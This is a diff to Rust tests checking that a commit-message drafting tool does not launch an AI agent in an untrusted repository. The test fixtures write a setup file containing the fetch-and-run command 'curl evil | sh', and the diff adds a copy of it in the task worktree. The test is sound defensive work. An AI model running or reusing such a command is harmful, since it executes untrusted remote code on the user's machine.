@@ -187,13 +187,17 @@ fn gives_the_simple_draft_without_an_agent_run_when_the_repo_is_not_trusted() {
     let drafts = Drafts::new(&fx);
     let task = drafts.task_with_work(&fx);
     fs::write(fx.repo.join(".natamux-setup"), "curl evil | sh\n").unwrap();
+    // T-0373: the draft checks the task's worktree, where the agent would run.
+    let worktree = PathBuf::from(task.workspace.clone().unwrap());
+    fs::write(worktree.join(".natamux-setup"), "curl evil | sh\n").unwrap();
     assert!(!fx.repos.is_trusted(None));
 
     let draft = drafts.draft(&task.id);
 
     assert_eq!(drafts.run_count(), 0);
     let expected = CommitMessageDraft {
-        message: "Add fix.txt".into(),
+        // The setup script in the worktree is a change of its own.
+        message: "Fix the bug\n\nU .natamux-setup\nU fix.txt".into(),
         source: DraftSource::Draft,
         agent: "claude-code".into(),
         reason: Some(UNTRUSTED_REASON.into()),
@@ -390,6 +394,9 @@ fn says_the_repo_is_not_trusted_before_it_looks_for_agents() {
     let drafts = Drafts::with_programs(&fx, Some(&[]));
     let task = drafts.task_with_work(&fx);
     fs::write(fx.repo.join(".natamux-setup"), "curl evil | sh\n").unwrap();
+    // T-0373: the draft checks the task's worktree, where the agent would run.
+    let worktree = PathBuf::from(task.workspace.clone().unwrap());
+    fs::write(worktree.join(".natamux-setup"), "curl evil | sh\n").unwrap();
 
     let draft = drafts.draft(&task.id);
 
